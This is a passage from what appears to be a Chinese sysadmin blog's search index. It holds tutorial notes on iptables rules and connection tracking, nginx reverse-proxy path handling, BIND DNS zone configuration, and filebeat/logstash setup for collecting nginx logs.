允许10秒内存在于列表中的IP连接22端口 iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --name sshlogin --rcheck --seconds 10 -j ACCEPT # 允许ESTABLISHED状态的ssh连接 iptables -A INPUT -p tcp --dport 22 -m state --state ESTABLISHED -j ACCEPT ","date":"2021-04-27 11:00","objectID":"/post/2347/:0:1","tags":["iptables"],"title":"iptables-模块\u0026amp;规则记录","uri":"/post/2347/"},{"categories":["基础内容"],"content":"本文引自: https://www.frozentux.net/iptables-tutorial/cn/iptables-tutorial-cn-1.1.19.html#STATEMACHINE，修改了部分内容，便于自己理解 ","date":"2021-04-23 15:54","objectID":"/post/2337/:0:0","tags":["iptables"],"title":"iptables状态机制(连接跟踪机制)","uri":"/post/2337/"},{"categories":["基础内容"],"content":"一、概述 状态机制(连接跟踪)是iptables中特殊的一部分，状态机制可以让Netfilter知道某个特定连接的状态。 在iptables里，包是和 状态机制的四种不同状态有关的。它们是NEW，ESTABLISHED，RELATED和INVALID。 使用-m --state匹配操作，我们能很容易地控制 “谁或什么能发起新的会话”。 所有在内核中由Netfilter的特定框架做的连接跟踪称作conntrack（译者注：就是connection tracking 的首字母缩写）。conntrack可以作为模块安装，也可以作为内核的一部分。conntrack中有许多用来处理TCP、UDP或ICMP协议的部件。这些模块从数据包中提取详细的、唯一的信息，因此能保持对每一个数据流的跟踪。这些信息也告知conntrack流当前的状态。例如，UDP流一般由他们的目的地址、源地址、目的端口和源 端口唯一确定。 除了本地产生的包由OUTPUT链处理外，所有连接跟踪都是在PREROUTING链里进行处理的，意思就是， iptables会在PREROUTING链里从新计算所有的状态。如果我们发送一个流的初始化包，状态就会在OUTPUT链里被设置为NEW，当我们收到回应的包时，状态就会在PREROUTING链里被设置为ESTABLISHED。如果第一个包不是本地产生的，那就会在PREROUTING链里被设置为NEW状态。综上，所有状态的改变和计算都是在nat表中的PREROUTING链和OUTPUT链里完成的。 ","date":"2021-04-23 15:54","objectID":"/post/2337/:0:1","tags":["iptables"],"title":"iptables状态机制(连接跟踪机制)","uri":"/post/2337/"},{"categories":["基础内容"],"content":"二、conntrack记录 我们先来看看怎样阅读/proc/net/ip_conntrack里的conntrack记录。这些记录表示的是当前被跟踪的连接。如果安装了ip_conntrack模块，cat /proc/net/ip_conntrack的显示类似下面这样：(新版本叫nf_conntrack) ipv4 2 tcp 6 299 ESTABLISHED src=192.168.10.252 dst=192.168.10.150 sport=59148 dport=22 src=192.168.10.150 dst=192.168.10.252 sport=22 dport=59148 [ASSURED] mark=0 secctx=system_u:object_r:unlabeled_t:s0 zone=0 use=2 ipv4 2 udp 17 9 src=0.0.0.0 dst=255.255.255.255 sport=68 dport=67 [UNREPLIED] src=255.255.255.255 dst=0.0.0.0 sport=67 dport=68 mark=0 secctx=system_u:object_r:unlabeled_t:s0 zone=0 use=2 conntrack模块维护的所有信息都包含在这个例子中了，通过它们就可以知道某个特定的连接处于什么状态。 第一列: 网络层协议名称 第二列: 可能是网络层的协议类型代码 第三列: 传输层协议名称 第四列: 传输层协议类型代码(可在/etc/protocols中查看) 第五列: 这条conntrack记录的生存时间秒，这个值会每秒递减，有新的流量进来后，这个值会重置回默认值。比如tcp的默认是432000，udp是30，每当进行通信或交换数据时都会重置此值。(/proc/sys/net/netfilter/nf_conntrack_tcp_timeout_established)or(sysctl -a |grep net.netfilter.nf_conntrack_tcp_) ESTABLISHED: tcp状态信息，udp没有这一列。 后面的是请求地址和端口，有两对。第一对代表请求端，第二对代表响应端 [ASSURED]: 说明两个方向都有流量，在连接跟踪表满时，没有[ASSURED]的记录就要被删除。 [UNREPLIED]: 说明这个连接还没有收到任何响应 跟踪条目是存在内存中的，默认最大可保存65536条记录(/proc/sys/net/netfilter/nf_conntrack_max),超过后会发生丢包，/var/log/messages报错kernel: nf_conntrack: table full, dropping packet ###三、 数据包在用户空间的状态 iptables中的四种连接状态 NEW NEW代表新连接的第一个包。 ESTABLISHED 只要我们发送并接到对端的应答，连接就是ESTABLISHED状态了。 RELATED 一个连接要想 是RELATED的，首先要有一个ESTABLISHED的连接。这个ESTABLISHED连接再产生一个主连接之外的连接，这个新的连接就是RELATED的了，当然前提是conntrack模块要能理解RELATED。ftp是个很好的例子，FTP-data连接 和 FTP-control连接 有 RELATED的关系。还有其他的例子，比如，通过IRC的DCC连接。有了这个状态，ICMP应答、FTP传输、DCC等才能穿过防火墙正常工作。注意，大部分还有一些UDP协议都依赖这个机制。这些协议 是很复杂的，它们把连接信息放在数据包里，并且要求这些信息能被正确理解。 INVALID INVALID说明数据包不能被识别属于哪个连接或没有任何状态。有几个原因可以产生这种情况，比如，内存溢出，收到不知属于哪个连接的ICMP 错误信息。一般地，我们DROP这个状态的任何东西。 ","date":"2021-04-23 15:54","objectID":"/post/2337/:0:2","tags":["iptables"],"title":"iptables状态机制(连接跟踪机制)","uri":"/post/2337/"},{"categories":["基础内容"],"content":"iptables man手册: https://linux.die.net/man/8/iptables iptables中文文档: https://www.frozentux.net/iptables-tutorial/cn/iptables-tutorial-cn-1.1.19.html 备用链接: https://soulchild.cn/iptables ","date":"2021-04-21 17:40","objectID":"/post/2328/:0:0","tags":["iptables"],"title":"iptables命令介绍(二)","uri":"/post/2328/"},{"categories":["基础内容"],"content":"一、iptables命令行语法格式 格式: iptables [-t table] command [match] [target] -t table: 指定表名，不指定默认是filter表 COMMAND: 告诉iptables我们要做什么，比如添加规则、删除规则、替换规则、修改规则、插入规则等等 match: 要对哪些数据包做操作，可以指定包的来源IP地址，网络接口，端口，协议类型等等来选择数据包 target: 指定要执行的操作,比如DROP、ACCEPT、SNT、DNAT。(可在中文文档6.5部分查阅) 下图引自: https://www.cnblogs.com/kevingrace/p/6265113.html 50965-s09k6z8ubo.png ","date":"2021-04-21 17:40","objectID":"/post/2328/:0:1","tags":["iptables"],"title":"iptables命令介绍(二)","uri":"/post/2328/"},{"categories":["基础内容"],"content":"二、iptables的COMMAND（https://soulchild.cn/iptables/#COMMANDS） -A chain: 在指定的链中追加规则(尾部) -I chain [rulenum]: 在指定的链中插入规则(默认在首部，可以指定规则编号) -D chain [rulenum]: 删除指定链中的规则(默认删除最后一个) -R chain [rulenum]: 替换指定链中的规则 -F: 清除指定的链中的规则(如果未指定链,则清除表中的所有链的规则) -N: 自定义新链 -X: 删除自定义链(必须是空链) -L: 列出所选链中的所有规则 -n以数字显示端口信息 -v|-vv显示规则的详细信息(包括每个规则匹配到的数据包数量) –line 显示规则编号 Z: 将指定表中的所有链的字节和数据包计数器清零 -P: 修改指定链中的默认规则，所有规则不能匹配的时候会使用默认规则 ","date":"2021-04-21 17:40","objectID":"/post/2328/:0:2","tags":["iptables"],"title":"iptables命令介绍(二)","uri":"/post/2328/"},{"categories":["基础内容"],"content":"三、matches(匹配条件https://soulchild.cn/iptables/#MATCHES) 介绍一些常用的 -p, --protocol: 匹配协议，不同协议有不同的匹配参数.不指定协议默认为所有协议 tcp和udp协议 --tcp-flags: 此选项是tcp协议的。 该选项有两个列表类型的参数。 第一个列表指定我们要检查的标志位。 第二个列表指定 在第一个列表中出现过的且必须被设为1的标志位,第一个列表中其他的标志位必须置0 比如: -p tcp --tcp-flags SYN,ACK,FIN SYN,ACK,这里匹配的是SYN和ACK为1，FIN为0的数据包 -m multiport: 让下面的选项支持匹配多个端口，写法22,53,80,110。并且支持--ports参数，--ports代表了源和目的端口 --sport, --source-port: 源端口 --dport, --destination-port: tcp包的目的端口 -s, --src, --source: 匹配源地址 -d, --dst, --destination: 匹配目标地址 -i, --in-interface: 匹配从网络接口进来的数据包，只能用于INPUT，FORWARD和 PREROUTING这三个链 -o, --out-interface: 匹配从网络接口出去的数据包 -f, --fragment: 用来匹配一个被分片的包的第二片或及以后的部分。 -m --state: 指定要匹配包的的状态，有4种状态可用：INVALID，ESTABLISHED，NEW和RELATED。 INVALID: 意味着这个包没有已知的流或连接与之关联，也可能是它包含的数据或包头有问题。 ESTABLISHED: 意思是包是完全有效的，而且属于一个已建立的连接，这个连接的两端都已经有数据发送。 NEW: 表示包将要或已经开始建立一个新的连接 RELATED: 说明包正在建立一个新的连接，这个连接是和一个已建立的连接相关的。比如FTP-data和FTP-control就是RELATED关系 ","date":"2021-04-21 17:40","objectID":"/post/2328/:0:3","tags":["iptables"],"title":"iptables命令介绍(二)","uri":"/post/2328/"},{"categories":["基础内容"],"content":"四、target( 执行的动作https://soulchild.cn/iptables/#TARGETS ) target决定符合条件的包到何处去，语法是--jump target或-j target。 我们在filter表中建一个名为tcp_packets的链：iptables -N tcp_packets 然后再把它作为jump的target：iptables -A INPUT -p tcp -j tcp_packets 这样我们就会从INPUT链跳入tcp_packets链，开始在tcp_packets中的旅行。如果到达了tcp_packets链后,未被链中的任何规则匹配，则会退到INPUT链的下一条规则继续它的旅行。如果在子链(tcp_packets)中被ACCEPT了，也就相当于在父链中被ACCEPT了，那么它不会再经过父链中的其他规则。但要注意这个包能被其他表的链匹配，过程可以参考表的优先级。 target指定我们要对包做的操作，比如DROP和ACCEPT等等，下面介绍一些常用的。 -j ACCEPT: 放行 -j DROP: 丢弃 -j REJECT: 与DROP的区别是，REJECT就向客户端响应一个错误信息，可以通过--reject-with选项来控制(默认port-unreachable),可用选项如下 icmp-net-unreachable: 网络不可达 icmp-host-unreachable: 主机不可达 icmp-port-unreachable: 端口不可达 icmp-proto-unreachable: 协议不可达 icmp-net-prohibited: 目的网络被强制禁止 icmp-host-prohibited: 目的主机被强制禁止 -j LOG: LOG只会记录包的相关信息.可以在/var/log/messages中查看。(详细介绍https://soulchild.cn/iptables/#LOGTARGET) -j ULOG: 支持将LOG写到数据库中 -j DNAT: 目的网络地址转换。通常用于外部访问内部。 例如: iptables -t nat -A PREROUTING -d 15.45.23.67 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1-192.168.1.10。 需要注意：数据包发向内部主机后，会向源地址响应，但是客户端请求的是iptables主机，这样的话tcp无法握手成功。需要将内部主机的网关指向iptables主机。或者在加一条SNAT规则将源地址改为本地IP(iptables -t nat -A POSTROUTING -p tcp --dport 80 -j SNAT --to-source 192.168.1.150) -j SNAT: 源网络地址转换。通常用于内部访问外部 例如: iptables -t nat -A POSTROUTING -p tcp --dport 80 -j SNAT --to-source 192.168.10.150 -j MASQUERADE: 和SNAT的作用是一样的，区别就是它不需要指定–to-source。而是自动获取网卡的IP地址,如果条件允许建议使用SNAT -j REDIRECT: 将数据包的端口重定向到本机另一个端口(适用于本地端口的转发(效率高),DNAT适合外部主机的转发)。 例如: iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080 -j RETURN: 它使包返回上一层，顺序是：子链——\u003e父链——\u003e默认策略。具体地说，就是若包在子链中遇到了RETURN，则返回父链的下一条规则继续进行条件的比较，若是在父链（或称主链，比如INPUT）中遇到了RETURN，就要应用默认的策略（一般是ACCEPT或DROP）。 -j NOTRACK: 对指定的包不做状态追踪 例如: iptables -t raw -I PREROUTING -p tcp --dport 22 -j NOTRACK iptables -t raw -I OUTPUT -p tcp --dport 22 -j NOTRACK ","date":"2021-04-21 17:40","objectID":"/post/2328/:0:4","tags":["iptables"],"title":"iptables命令介绍(二)","uri":"/post/2328/"},{"categories":["基础内容"],"content":"五、常用的例子 放行80端口 iptables -I INPUT -p tcp --dport 80 -j ACCEPT ","date":"2021-04-21 17:40","objectID":"/post/2328/:0:5","tags":["iptables"],"title":"iptables命令介绍(二)","uri":"/post/2328/"},{"categories":["基础内容"],"content":"将filter表的INPUT、OUTPUT链默认规则改为DROP iptables -P INPUT DROP iptables -P OUTPUT DROP 开放本地回环地址 iptables -I INPUT -i lo -j ACCEPT DNS服务器配置 #开放UDP 53端口(接收外部DNS服务器响应 和 接收其他服务器的DNS请求) iptables -A INPUT -p udp -m multiport --port 53 -j ACCEPT #开放TCP 53端口(用于区域文件传输使用,对于主DNS可以只开放dport 53) iptables -A INPUT -p tcp -m multiport --port 53 -j ACCEPT 允许内部ping外部，禁止外部ping内部 类型参考https://soulchild.cn/iptables/#TABLE.ICMPTYPES 0: icmp应答包 8: icmp请求包 # 允许本地接收icmp应答包 iptables -A INPUT -p icmp --icmp-type 0 -j ACCEPT # 拒绝本地接收icmp请求包 iptables -A INPUT -p icmp --icmp-type 8 -j DROP 如果OUTPUT链默认策略是DROP，还需要允许本地发送icmp请求包 iptables -A OUTPUT -p icmp --icmp-type 8 -j ACCEPT ","date":"2021-04-21 17:40","objectID":"/post/2328/:0:6","tags":["iptables"],"title":"iptables命令介绍(二)","uri":"/post/2328/"},{"categories":["系统服务"],"content":"nginx反向代理的时候加/和不加/区别很大，情况也有很多种，容易忘记记混，这里记录一些情况 ","date":"2021-04-21 14:29","objectID":"/post/2326/:0:0","tags":["nginx"],"title":"nginx反向代理加斜杠和不加斜杠的问题","uri":"/post/2326/"},{"categories":["系统服务"],"content":"默认情况下 location / { proxy_pass http://127.0.0.1:8888; # 访问: http://localhost/test/1 ==\u003e http://127.0.0.1:8888/test/1 } ","date":"2021-04-21 14:29","objectID":"/post/2326/:0:1","tags":["nginx"],"title":"nginx反向代理加斜杠和不加斜杠的问题","uri":"/post/2326/"},{"categories":["系统服务"],"content":"location和proxy_pass不同地方加/ location /test01 { proxy_pass http://127.0.0.1:8888; # localhost/test01/123 ==\u003e 127.0.0.1:8888/test01/123 } location /test02/ { # 注意不会匹配localhost/test02 proxy_pass http://127.0.0.1:8888; # localhost/test02/123 ==\u003e 127.0.0.1:8888/test02/123 } location /test03/ { # 注意不会匹配localhost/test03 proxy_pass http://127.0.0.1:8888/; # localhost/test03/ ==\u003e 127.0.0.1:8888/ # localhost/test03/123 ==\u003e 127.0.0.1:8888/123 } location /test04 { proxy_pass http://127.0.0.1:8888/; # localhost/test04aaa ==\u003e 127.0.0.1:8888/aaa # localhost/test04/123 ==\u003e 127.0.0.1:8888//123 } ","date":"2021-04-21 14:29","objectID":"/post/2326/:0:2","tags":["nginx"],"title":"nginx反向代理加斜杠和不加斜杠的问题","uri":"/post/2326/"},{"categories":["系统服务"],"content":"proxy_pass带后缀的 location /test06 { proxy_pass http://127.0.0.1:8888/uri; # localhost/test06 ==\u003e 127.0.0.1:8888/uri # localhost/test06/ ==\u003e 127.0.0.1:8888/uri/ # localhost/test06aaa ==\u003e 127.0.0.1:8888/uriaaa # localhost/test06/aaa ==\u003e 127.0.0.1:8888/uri/aaa } location /test07 { proxy_pass http://127.0.0.1:8888/uri/; # localhost/test07 ==\u003e 127.0.0.1:8888/uri/ # localhost/test07/ ==\u003e 127.0.0.1:8888/uri// # localhost/test07aaa ==\u003e 127.0.0.1:8888/uri/aaa # localhost/test07/aaa ==\u003e 127.0.0.1:8888/uri//aaa } location /test08/ { proxy_pass http://127.0.0.1:8888/uri; # localhost/test08/ ==\u003e 127.0.0.1:8888/uri # localhost/test08/aaa ==\u003e 127.0.0.1:8888/uriaaa # localhost/test08/aaa/ ==\u003e 127.0.0.1:8888/uriaaa/ } location /test09/ { proxy_pass http://127.0.0.1:8888/uri/; # localhost/test09/ ==\u003e 127.0.0.1:8888/uri/ # localhost/test09/aaa ==\u003e 127.0.0.1:8888/uri/aaa # localhost/test09/aaa/ ==\u003e 127.0.0.1:8888/uri/aaa/ } ","date":"2021-04-21 14:29","objectID":"/post/2326/:0:3","tags":["nginx"],"title":"nginx反向代理加斜杠和不加斜杠的问题","uri":"/post/2326/"},{"categories":["基础内容"],"content":"参考文章: https://www.cnblogs.com/kevingrace/p/6265113.html https://www.frozentux.net/iptables-tutorial/cn/iptables-tutorial-cn-1.1.19.html iptables的基本概念 ","date":"2021-04-20 14:24","objectID":"/post/2324/:0:0","tags":["iptables"],"title":"iptables基本介绍(一)","uri":"/post/2324/"},{"categories":["基础内容"],"content":"一、链: 每个链下都会有很多规则,当一个数据包到达一个链时，iptables就会从链中第一条规则开始检查，看该数据包是否满足规则所定义的条件。如果满足，系统就会根据 该条规则所定义的方法处理该数据包；否则iptables将继续检查下一条规则，如果该数据包不符合链中任一条规则，iptables就会根据该链预先定义的默认策略来处理数据包。 PREROUTING: 控制刚从网卡到达内核时的数据包，即经过路由表之前(流量进来的第一个环节) INPUT: 控制通向本地套接字(本地进程)的数据包 FORWARD: 控制转发到其他主机的数据包 OUTPUT: 控制本地套接字(本地进程)发往外部的数据包 POSTROUTING: 控制所有发到网卡前的数据包，即经过路由表之后(流量出去的最后一个环节) ","date":"2021-04-20 14:24","objectID":"/post/2324/:0:1","tags":["iptables"],"title":"iptables基本介绍(一)","uri":"/post/2324/"},{"categories":["基础内容"],"content":"二、表: 优先级raw\u003emangle\u003enat\u003efilter 31190-9qlptu8yskf.png filter: iptables工具的默认表,用于过滤数据包。 包含INPUT、FORWARD、OUTPUT链 nat: 可以修改sip、dip、sport、dport。 包含PREROUTING、INPUT(centos7包含)、OUTPUT、POSTROUTING链 mangle: 不能过滤数据包也不能修改数据包。允许的操作是修改TOS、TTL、MARK 包含所有链 raw: 决定数据包是否被状态跟踪机制处理 包含PREROUTING、OUTPUT链 security: 此表用于强制访问控制(MAC)网络规则，例如由SECMARK和CONNSECMARK目标启用的规则。 包含INPUT、FORWARD、OUTPUT链 ","date":"2021-04-20 14:24","objectID":"/post/2324/:0:2","tags":["iptables"],"title":"iptables基本介绍(一)","uri":"/post/2324/"},{"categories":["基础内容"],"content":"三、规则: 规则就是如果数据包满足指定条件，执行某些操作。规则是有顺序的，当某一条规则匹配成功后就不会匹配后面的规则 ","date":"2021-04-20 14:24","objectID":"/post/2324/:0:3","tags":["iptables"],"title":"iptables基本介绍(一)","uri":"/post/2324/"},{"categories":["基础内容"],"content":"四、数据包处理流程 48851-gwmc7hqmx8f.png 注意如果数据包先和某个表中的链的规则匹配成功，则不会和其他表匹配了。 ","date":"2021-04-20 14:24","objectID":"/post/2324/:0:4","tags":["iptables"],"title":"iptables基本介绍(一)","uri":"/post/2324/"},{"categories":["系统服务"],"content":"1./etc/named.conf listen-on port 53 { localhost; }; allow-query { localhost;any; }; allow-transfer { 172.17.10.151; }; // 配置只允许172.17.10.151，作为从服务器拉取配置 dnssec-enable no; dnssec-validation no; recursion yes; recursion no; //使用迭代查询处理请求,当客户端请求解析时,本地有缓存或者有区域记录则会返回对应的信息,否则解析失败，因为我们不是根域,没有顶级域的信息，所以无法告知客户端寻找其他服务器。 2.使用rndc命令管理bind rndc使用的是953/tcp端口 rndc参数: reload: 重新加载配置文件和所有zone reload zonename: 重新加载单个zone retransfer zonename: 重新传输单个zone，不检查序列号 notify zonename: 重新发送zone的通知消息 reconfig: 重新加载主配置文件 querylog [ on | off ]: 启用/禁用查询日志记录 trace: 将调试级别增加1 trace LEVEL: 修改调试级别 notrace: 修改调试级别为0 flush: 清空DNS所有缓存记录 ","date":"2021-04-13 17:03","objectID":"/post/2317/:0:0","tags":["dns","bind"],"title":"dns服务bind配置","uri":"/post/2317/"},{"categories":["系统服务"],"content":"正向解析 1./etc/named.rfc1912.zones zone \"soulchild.com\" IN { type master; file \"soulchild.com.zone\"; allow-update { none; }; // 不允许客户端注册这个zone记录。设置为any或其他ip表示允许，比如可以通过nsupdate动态更新解析记录。 }; 2./var/named/soulchild.com.zone $TTL 3H @ IN SOA @ 742899387.qq.com. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS @ A 172.17.0.150 websrv A 1.1.1.1 websrv A 2.2.2.2 websrv A 3.3.3.3 www 1 CNAME websrv @ MX 10 mail1 mail1 A 4.4.4.4 $GENERATE 1-100 web$ A 10.0.0.$ ; 生成1-100的数字,web1对应10.0.0.1, web2对应10.0.0.2 ","date":"2021-04-13 17:03","objectID":"/post/2317/:0:1","tags":["dns","bind"],"title":"dns服务bind配置","uri":"/post/2317/"},{"categories":["系统服务"],"content":"反向解析 1./etc/named.rfc1912.zones zone \"0.17.172.in-addr.arpa\" IN { type master; file \"172.17.10.zone\"; allow-update { none; }; }; 2./var/named/172.17.0.zone $TTL 1D @ IN SOA @ rname.invalid. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS @ A 127.0.0.1 150 PTR soulchild.com. 重新加载rndc reload 测试:dig -x 172.17.0.150 @172.17.10.150 ","date":"2021-04-13 17:03","objectID":"/post/2317/:0:2","tags":["dns","bind"],"title":"dns服务bind配置","uri":"/post/2317/"},{"categories":["系统服务"],"content":"原文链接：https://blog.csdn.net/starxu85/article/details/3357652 Bind的SOA记录：每个Zone仅有一个SOA记录。SOA记录包括Zone的名字，一个技术联系人和各种不同的超时值。 例子： $ORIGIN . $TTL 3600 ; 1 hour 10235.com IN SOA ns1.abc.com. root.ns1.abc.com. ( 2007061402 ; serial 3600 ; refresh (1 hour) 900 ; retry (15 minutes) 1209600 ; expire (2 weeks) 3600 ; minimum (1 hour) ) ","date":"2021-04-13 16:05","objectID":"/post/2314/:0:0","tags":["dns","bind"],"title":"bind SOA配置说明","uri":"/post/2314/"},{"categories":["系统服务"],"content":"第三行 10235.com：代表当前域，可以用@代替 ns1.abc.com.：指定当前域的主DNS SERVER root.ns1.abc.com.：管理员邮箱(@使用.代替),等同于root@ns1.abc.com. ###Serial 数值Serial代表这个Zone的序列号。供Slave DNS判断是否从Master DNS获取新数据。每次Zone文件更新，都需要修改Serial数值。RFC1912 2.2建议的格式为YYYYMMDDnn 其中nn为修订号; ###Refresh 数值Refresh设置Slave DNS多长时间与Master Server进行Serial核对。目前Bind的notify参数可设置每次Master DNS更新都会主动通知Slave DNS更新，Refresh参数主要用于notify参数关闭时; ###Retry 数值Retry设置当Slave DNS试图获取Master DNS Serial时，如果Master DNS未响应，多长时间重新进行检查; ###Expire 数值Expire将决定Slave DNS在没有Master DNS的情况下权威地提供域名解析服务的时间长短; ###Minimum 否定答案的TTL,当服务器没有解析到域名时，设置客户端缓存时间 在8.2版本之前，由于没有独立的 $TTL 指令，所以通过 SOA 最后一个字段来实现。但由于 BIND 8.2 后出现了 $TTL 指令，该部分功能就不再由 SOA 的最后一个字段来负责，由 $TTL 全权负责 ","date":"2021-04-13 16:05","objectID":"/post/2314/:0:1","tags":["dns","bind"],"title":"bind SOA配置说明","uri":"/post/2314/"},{"categories":["系统服务"],"content":"firewall-cmd --direct --permanent --add-rule ipv4 filter INPUT 0 --in-interface eth1 --destination 224.0.0.18 --protocol vrrp -j ACCEPT ","date":"2021-04-09 17:20","objectID":"/post/2312/:0:0","tags":[],"title":"firewalld开放vrrp协议","uri":"/post/2312/"},{"categories":["系统服务","ELK日志收集"],"content":"一、nginx日志改造 定义json日志格式 log_format json '{ \"@timestamp\": \"$time_iso8601\", ' '\"remote_addr\": \"$remote_addr\", ' '\"remote_user\": \"$remote_user\", ' '\"body_bytes_sent\": \"$body_bytes_sent\", ' '\"request_time\": \"$request_time\", ' '\"status\": \"$status\", ' '\"request_host\": \"$host\", ' '\"request_method\": \"$request_method\", ' '\"request_uri\": \"$request_uri\", ' '\"uri\": \"$uri\", ' '\"http_referrer\": \"$http_referer\", ' '\"body_bytes_sent\":\"$body_bytes_sent\", ' '\"http_x_forwarded_for\": \"$http_x_forwarded_for\", ' '\"http_user_agent\": \"$http_user_agent\" ' '}'; 2.替换main为json格式 cd /usr/local/nginx/conf/conf.d/;ls | xargs -l sed -i 's#main;#json;# ","date":"2021-04-08 17:13","objectID":"/post/2309/:0:1","tags":["nginx","elk"],"title":"filebeat+logstash收集nginx日志","uri":"/post/2309/"},{"categories":["系统服务","ELK日志收集"],"content":"二、配置filebeat filebeat.inputs: - type: log paths: - /usr/local/nginx/logs/*_access.log fields_under_root: true fields: log_type: nginx_access env: test json: keys_under_root: true overwrite_keys: true - type: log paths: - /usr/local/nginx/logs/*_error.log fields_under_root: true fields: log_type: nginx_error env: test processors: - add_host_metadata: netinfo.enabled: true - drop_fields: fields: - input - agent - ecs - beat - prospector - name - host.architecture - host.os - host.id - host.containerized - host.mac - host.name output.redis: hosts: [\"1.1.1.1\"] datatype: \"list\" db: 0 key: \"nginx_test\" ","date":"2021-04-08 17:13","objectID":"/post/2309/:0:2","tags":["nginx","elk"],"title":"filebeat+logstash收集nginx日志","uri":"/post/2309/"},{"categories":["系统服务","ELK日志收集"],"content":"三、配置logstash 1.input-from-redis.config input { redis { data_type =\u003e \"list\" db =\u003e 0 host =\u003e \"1.1.1.1\" key =\u003e \"nginx_test\" } } 2.filter.config filter { mutate { add_field =\u003e { \"handler\" =\u003e \"${HOSTNAME:logstash-01}\" } } } 3.output-into-es.config output{ if [log_type] == \"blade_java\" or [log_type] == \"springboot_java\" { elasticsearch { hosts =\u003e [\"2.2.2.1:9200\", \"2.2.2.2:9200\", \"2.2.2.3:9200\"] index =\u003e \"%{project}-%{env}-%{app}-%{+yyyy.MM.dd}\" user =\u003e \"log_agent\" password =\u003e \"loados-log\" } } if [log_type] in [\"nginx_access\", \"nginx_error\"] { elasticsearch { hosts =\u003e [\"2.2.2.1:9200\", \"2.2.2.2:9200\", \"2.2.2.3:9200\"] index =\u003e \"%{log_type}-%{env}-%{+yyyy.MM.dd}\" user =\u003e \"log_agent\" password =\u003e \"loados-log\" } } } ","date":"2021-04-08 17:13","objectID":"/post/2309/:0:3","tags":["nginx","elk"],"title":"filebeat+logstash收集nginx日志","uri":"/post/2309/"},{"categories":["ELK日志收集"],"content":"date过滤器用于解析字段中的日期，然后使用该日期或时间戳作为日志存储时间(@timestamp).也可以通过target选项自定义 例如syslog的时间格式:Apr 17 09:32:01,可以使用MMM dd HH:mm:ss来解析 ","date":"2021-04-01 17:29","objectID":"/post/2300/:0:0","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之date简单介绍(五)","uri":"/post/2300/"},{"categories":["ELK日志收集"],"content":"示例: 将按照指定的格式，解析事件中date字段。将解析出来的内容替换到@timestamp filter { date { # 时间：2021-04-01 15:29:43.607 match =\u003e [ \"date\", \"yyyy-MM-dd HH:mm:ss.SSS\" ] } } ","date":"2021-04-01 17:29","objectID":"/post/2300/:1:0","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之date简单介绍(五)","uri":"/post/2300/"},{"categories":["ELK日志收集"],"content":"日期语法简介 完整: https://www.elastic.co/guide/en/logstash/7.8/plugins-filters-date.html: ","date":"2021-04-01 17:29","objectID":"/post/2300/:2:0","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之date简单介绍(五)","uri":"/post/2300/"},{"categories":["ELK日志收集"],"content":"年 yyyy: 完整的年份，例如2015 yy: 两位数的年份. 例如: 2015年的15 ","date":"2021-04-01 17:29","objectID":"/post/2300/:2:1","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之date简单介绍(五)","uri":"/post/2300/"},{"categories":["ELK日志收集"],"content":"月 M: 一位数的月。例如: 1表示1月,12表示12月 MM: 两位数的月份。例如: 01表示1月,12表示12月 MMM: 简写英文。例如: Jan表示1月,Dec表示12月. 注意:使用的语言取决于您的地区。locale配置 MMMM: 完整英文。例如: January表示1月. 注意:使用的语言取决于您的地区。locale配置 ","date":"2021-04-01 17:29","objectID":"/post/2300/:2:2","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之date简单介绍(五)","uri":"/post/2300/"},{"categories":["ELK日志收集"],"content":"日 d: 一位数的日。例如: 3号 dd: 两位数的日。例如: 03号 ","date":"2021-04-01 17:29","objectID":"/post/2300/:2:3","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之date简单介绍(五)","uri":"/post/2300/"},{"categories":["ELK日志收集"],"content":"时 H: 一位数的小时。例如: 1点 HH: 两位数的小时。例如: 01点 ","date":"2021-04-01 17:29","objectID":"/post/2300/:2:4","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之date简单介绍(五)","uri":"/post/2300/"},{"categories":["ELK日志收集"],"content":"分 m: 一位数的分。例如: 6分 mm: 两位数的分。例如: 06分 ","date":"2021-04-01 17:29","objectID":"/post/2300/:2:5","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之date简单介绍(五)","uri":"/post/2300/"},{"categories":["ELK日志收集"],"content":"秒 s: 一位数的秒 ss: 两位数的秒 ","date":"2021-04-01 17:29","objectID":"/post/2300/:2:6","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之date简单介绍(五)","uri":"/post/2300/"},{"categories":["ELK日志收集"],"content":"更大精度的秒 S: 十分之一秒 SS: 百分之一秒 SSS: 千分之一秒 ","date":"2021-04-01 17:29","objectID":"/post/2300/:2:7","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之date简单介绍(五)","uri":"/post/2300/"},{"categories":["ELK日志收集"],"content":"时区偏移量或标识 Z: 格式HHmm,例如-0700。减7小时 ZZ: 格式HH:mm,例如-07:00。减7小时 ZZZ: 例如Asia/Shanghai ","date":"2021-04-01 17:29","objectID":"/post/2300/:2:8","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之date简单介绍(五)","uri":"/post/2300/"},{"categories":["ELK日志收集"],"content":"grok插件可以使用正则将非结构化的日志，解析成结构化日志。并且还可以使用内部预定义的正则。 预定义的正则: https://github.com/logstash-plugins/logstash-patterns-core/tree/master/patterns 在线调试工具: https://grokdebug.herokuapp.com/ ","date":"2021-03-31 16:15","objectID":"/post/2299/:0:0","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之grok(四)","uri":"/post/2299/"},{"categories":["ELK日志收集"],"content":"一、基本使用 ","date":"2021-03-31 16:15","objectID":"/post/2299/:1:0","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之grok(四)","uri":"/post/2299/"},{"categories":["ELK日志收集"],"content":"1.使用内置正则格式: %{NUMBER:duration} %{IP:client} NUMBER代表正则,duration代表正则解析出来内容，使用的字段名称 ","date":"2021-03-31 